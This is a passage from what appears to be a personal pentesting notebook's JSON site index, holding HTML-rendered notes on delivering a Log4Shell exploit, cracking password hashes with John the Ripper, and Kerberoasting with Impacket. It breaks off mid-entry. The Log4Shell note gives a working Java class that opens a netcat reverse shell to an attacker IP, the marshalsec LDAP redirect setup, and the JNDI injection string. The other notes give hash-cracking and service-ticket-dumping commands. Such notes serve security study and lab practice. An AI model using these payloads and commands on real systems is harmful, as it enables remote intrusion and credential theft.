7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;A simple Java exploit that pops a reverse shell (at least on Linux systems with a version of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; that supports the &lt;code&gt;-e&lt;/code&gt; switch) is:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;java&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;java&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;public&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; class&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt; Exploit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;\tstatic&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\ttry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t\t\tjava&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;lang&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;Runtime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;getRuntime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;().&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;exec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;nc -e /bin/bash 1.2.3.4 9999&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t\t}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; catch&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Exception &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t\t\te&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;printStackTrace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;();&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t\t}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Where 1.2.3.4 is the IP you’re catching the reverse shell at and 9999 is the port of the listener. This can be compiled with:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;javac&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; Exploit.java&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -source&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 8&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -target&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 8&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Note that the &lt;code&gt;-source&lt;/code&gt; and &lt;code&gt;-target&lt;/code&gt; flags may need to be modified depending on which version of Java the target is running. As with all things Java, the file name and file class name need to match.&lt;/p&gt;\n&lt;h3 id=&quot;delivery-with-log4shell&quot;&gt;Delivery with Log4Shell&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#delivery-with-log4shell&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Delivery through a vulnerable version of Log4j is done through a four step process: Malicious string → LDAP lookup → load Java code over &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/HTTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/HTTP&quot;&gt;HTTP&lt;/a&gt; → reverse shell.&lt;/p&gt;\n&lt;p&gt;A simple Java LDAP server that will handle redirects is available at &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;https://github.com/mbechler/marshalsec&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. It can be built with Apache Maven using the version of OpenJDK supplied with Kali Linux:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mvn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; clean&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; package&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -DskipTests&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Then run with:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;java&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -cp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; target/marshalsec-0.0.3-SNAPSHOT-all.jar&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;         marshalsec.jndi.LDAPRefServer&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;         &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;http://$ATTACKER_IP:$ATTACKER_PORT/#Exploit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Where &lt;code&gt;$ATTACKER_IP&lt;/code&gt; and &lt;code&gt;$ATTACKER_PORT&lt;/code&gt; are the IP address and port of an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Quick-n-dirty-Python-web-server&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Quick-n-dirty-Python-web-server&quot;&gt;HTTP server&lt;/a&gt; that will be used to actually serve up the exploit.&lt;/p&gt;\n&lt;p&gt;Once that’s done you’ll just need to fire up a quick web server to serve appropriate exploit code (like the example reverse shell above) and a &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; listener, and then find a way to deliver the malicious string (&lt;code&gt;${jndi:ldap://1.2.3.4:1389/Exploit}&lt;/code&gt;, where 1.2.3.4 is the &lt;code&gt;$ATTACKER_IP&lt;/code&gt; above) somewhere it will be logged.&lt;/p&gt;\n&lt;p&gt;Note that a number of other protocols are supported besides LDAP (the marchalsec server supports a few).&lt;/p&gt;"},"spells/John-the-Ripper":{"slug":"spells/John-the-Ripper","filePath":"spells/John the Ripper.md","title":"John the Ripper","links":["spells/grep","spells/cewl","spells/CUPP","spells/Hashcat","spells/John-the-Ripper","spells/UNIX-password-hashes","spells/SSH"],"tags":["Application/JohnTheRipper","AttackCycle/PrivEsc","Application/Metasploit","Application/grep","Application/cewl","Application/CUPP","Application/Hashcat","Cryptography/Hashes","Application/SSH"],"content":"john --format=$HASH_FORMAT \\\n     --wordlist=$WORDLIST $PASSWORD_HASH_FILE\nUsing the --format option is recommended, as many different hash formats have the same basic appearance, which make’s john’s attempt to guess the hash format without this information somewhat unreliable. John can only crack one type of hash at a time — no mixing-and-matching of hash formats. Use --list=formats to see available formats.\nJohn the Ripper can accept the output of hashdump from Metasploit (use --format=NT).\n\n\n                  \n                  Important\n                  \n                \n\n\nJohn the Ripper records cracked hash:password tuples in ~/.john/john.pot, and then references this file to avoid cracking known hashes. It doesn’t output these passwords again (instead simply declaring “[n]o password hashes left to crack”), so if you get no output then you’ll want to just grep for your hash in john.pot.\n\n\n\nSingle crack mode\nJohn’s “single crack mode” (--single) is just about exploiting bad password practice — basing passwords off of the username, or details of the operating system. It can be used over “unshadowed” UNIX-style passwords (in which case it will exploit not only the username, but data from other GECOS fields), or on single hashes (in which case the hash must be written as USERNAME:HASH so that John has something to go off of).\nObviously, a wordlist is not required in single crack mode.\nCustom rules\nPeople typically add “complexity” to a password by appending or prepending the required numbers and symbols (capital letters generally live on either the beginning or end of the password).\nJohn’s rules can be used to construct additional permutations of a wordlist to cover these cases. The rule syntax is weird, but close enough to regexps to be vaguely readable. Examples can be found in /etc/john/john.conf (the comments make for interesting reading), and a given ruleset from this file can be specified with --rules.\nRulesets are particularly useful when expanding a wordlist or (potential) password list of the sort that can be generated by cewl or CUPP.\njohn --wordlist=$WORD_LIST \\\n     --rules=$RULE_SET \\\n     --stdout &gt; $OUTFILE\nWhen in doubt, --rules=KoreLogic is a solid choice.\nHelper applications\nhash-identifier will indicate what hash types match the data in $PASSWORD_HASH_FILE. Use this + information about the province of the hashes to choose a likely format. Also useful in conjunction with Hashcat. (Note that the hash names used by hash-identifier do not correspond to those used by John the Ripper.)\nunshadow transforms /etc/passwd + /etc/shadow files (or matching subsets of these files) into a format John understands (note that --format is not generally necessary when having John crack the output on unshadow, as UNIX password hashes already specify their type).\nzip2john extracts information from encrypted zip files in a format suitable for John to ingest.\nrar2john extracts information from encrypted rar files in a format suitable for John to ingest.\npython2 /usr/share/john/ssh2john.py extracts information from encrypted SSH key files in a format suitable for John to ingest. Note that John is susceptible to false positives when cracking SSH keys, and will thus try the entire provided wordlist (just in case!).","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;john&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --format=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$HASH_FORMAT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --wordlist=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$WORDLIST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PASSWORD_HASH_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Using the &lt;code&gt;--format&lt;/code&gt; option is recommended, as many different hash formats have the same basic appearance, which make’s john’s attempt to guess the hash format without this information somewhat unreliable. John can only crack one type of hash at a time — no mixing-and-matching of hash formats. Use &lt;code&gt;--list=formats&lt;/code&gt; to see available formats.&lt;/p&gt;\n&lt;p&gt;John the Ripper can accept the output of hashdump from Metasploit (use &lt;code&gt;--format=NT&lt;/code&gt;).&lt;/p&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;John the Ripper records cracked hash:password tuples in ~/.john/john.pot, and then references this file to avoid cracking known hashes. It &lt;em&gt;doesn’t&lt;/em&gt; output these passwords again (instead simply declaring “[n]o password hashes left to crack”), so if you get no output then you’ll want to just &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/grep&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/grep&quot;&gt;grep&lt;/a&gt; for your hash in john.pot.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=&quot;single-crack-mode&quot;&gt;Single crack mode&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#single-crack-mode&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;John’s “single crack mode” (&lt;code&gt;--single&lt;/code&gt;) is just about exploiting bad password practice — basing passwords off of the username, or details of the operating system. It can be used over “unshadowed” UNIX-style passwords (in which case it will exploit not only the username, but data from other GECOS fields), or on single hashes (in which case the hash must be written as USERNAME:HASH so that John has something to go off of).&lt;/p&gt;\n&lt;p&gt;Obviously, a wordlist is not required in single crack mode.&lt;/p&gt;\n&lt;h2 id=&quot;custom-rules&quot;&gt;Custom rules&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#custom-rules&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;People typically add “complexity” to a password by appending or prepending the required numbers and symbols (capital letters generally live on either the beginning or end of the password).&lt;/p&gt;\n&lt;p&gt;John’s rules can be used to construct additional permutations of a wordlist to cover these cases. The rule syntax is weird, but close enough to regexps to be vaguely readable. Examples can be found in /etc/john/john.conf (the comments make for interesting reading), and a given ruleset from this file can be specified with &lt;code&gt;--rules&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;Rulesets are particularly useful when expanding a wordlist or (potential) password list of the sort that can be generated by &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/cewl&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/cewl&quot;&gt;cewl&lt;/a&gt; or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/CUPP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/CUPP&quot;&gt;CUPP&lt;/a&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;john&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --wordlist=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$WORD_LIST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --rules=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$RULE_SET&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --stdout&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $OUTFILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;When in doubt, &lt;code&gt;--rules=KoreLogic&lt;/code&gt; is a solid choice.&lt;/p&gt;\n&lt;h2 id=&quot;helper-applications&quot;&gt;Helper applications&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#helper-applications&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;code&gt;hash-identifier&lt;/code&gt; will indicate what hash types match the data in &lt;code&gt;$PASSWORD_HASH_FILE&lt;/code&gt;. Use this + information about the province of the hashes to choose a likely format. Also useful in conjunction with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hashcat&quot;&gt;Hashcat&lt;/a&gt;. (Note that the hash names used by &lt;code&gt;hash-identifier&lt;/code&gt; do &lt;em&gt;not&lt;/em&gt; correspond to those used by &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/John-the-Ripper&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/John-the-Ripper&quot;&gt;John the Ripper&lt;/a&gt;.)&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;unshadow&lt;/code&gt; transforms &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UNIX-password-hashes&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UNIX-password-hashes&quot;&gt;/etc/passwd + /etc/shadow&lt;/a&gt; files (or matching subsets of these files) into a format John understands (note that &lt;code&gt;--format&lt;/code&gt; is not generally necessary when having John crack the output on &lt;code&gt;unshadow&lt;/code&gt;, as &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UNIX-password-hashes&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UNIX-password-hashes&quot;&gt;UNIX password hashes&lt;/a&gt; already specify their type).&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;zip2john&lt;/code&gt; extracts information from encrypted zip files in a format suitable for John to ingest.&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;rar2john&lt;/code&gt; extracts information from encrypted rar files in a format suitable for John to ingest.&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;python2 /usr/share/john/ssh2john.py&lt;/code&gt; extracts information from encrypted &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; key files in a format suitable for John to ingest. Note that John is susceptible to false positives when cracking &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; keys, and will thus try the entire provided wordlist (just in case!).&lt;/p&gt;"},"spells/Kerberoasting-with-Impacket":{"slug":"spells/Kerberoasting-with-Impacket","filePath":"spells/Kerberoasting with Impacket.md","title":"Kerberoasting with Impacket","links":["spells/Impacket","spells/Hashcat"],"tags":["OS/Windows/ActiveDirectory","Protocol/Kerberos","AttackCycle/Exploitation/Kerberoasting","Application/Impacket","Application/Hashcat","OS/Linux/Distros/Kali"],"content":"Impacket can identify kerberoastable accounts and dump packets remotely. It comes standard with Kali Linux.\nGetUserSPNs.py ${DOMAIN}/${USER}:${PASSWORD} \\\n\t-dc-ip $DOMAIN_CONTROLLER_IP -request\nThe password hashes output here can then be cracked with Hashcat (use the 13100 hash mode).","richContent":"&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Impacket&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Impacket&quot;&gt;Impacket&lt;/a&gt; can identify kerberoastable accounts and dump packets remotely. It comes standard with Kali Linux.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;GetUserSPNs.py&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;DOMAIN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PASSWORD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-dc-ip&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $DOMAIN_CONTROLLER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -request&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The password hashes output here can then be cracked with &lt;a 